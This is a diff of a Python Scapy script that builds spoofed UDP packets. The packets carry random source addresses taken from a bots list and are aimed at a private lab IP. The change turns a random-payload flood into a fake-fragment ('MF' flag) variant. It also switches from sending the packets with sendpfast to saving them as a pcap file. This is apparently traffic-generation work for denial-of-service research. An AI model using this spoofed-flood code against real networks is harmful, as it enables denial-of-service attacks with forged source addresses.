@@ -6,7 +6,7 @@ import sys
 import ipaddress
 import os
 
-# UDP Random Payload
+# UDP Fake Frag
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
 BOTFILE = "../bots.txt"
@@ -25,7 +25,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_random_payload():
+def run_udp_fake_frag():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -35,7 +35,7 @@ def run_udp_random_payload():
     while True:
         source_ip = random.choice(bot_ips)
 
-        ip_layer = IP(src=source_ip, dst=TARGET_IP)
+        ip_layer = IP(src=source_ip, dst=TARGET_IP, flags="MF")
         eth_layer = Ether()
         udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)
 
@@ -51,16 +51,16 @@ def run_udp_random_payload():
 
 
     start_time = time.perf_counter()
-    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
+    wrpcap("udp_fake_frag.pcap", lista_de_pacotes)
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nSending completed.")
-    print(f"Total time to send packets: {duration:.4f} seconds")
+    print(f"\nPCAP file saved.")
+    print(f"Total time to save packets: {duration:.4f} seconds")
 
 
 if __name__ == "__main__":
-    run_udp_random_payload()
+    run_udp_fake_frag()
 
 
-# sudo PYTHONPATH=$HOME/scapy python3 udp_random_payload.py
+# sudo PYTHONPATH=$HOME/scapy python3 udp_fake_frag.py
